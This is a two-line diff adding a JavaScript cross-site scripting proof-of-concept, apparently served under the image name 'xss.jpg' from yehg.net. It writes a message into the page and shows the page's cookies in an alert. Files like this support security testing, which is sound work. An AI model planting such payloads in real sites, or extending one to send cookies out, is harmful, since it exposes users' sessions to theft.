@@ -1,0 +1,2 @@
+document.write ("This is remote text via xss.jpg located at yehg.net");
+alert ("This is remote text via xss.jpg located at yehg.net: " + document.cookie);
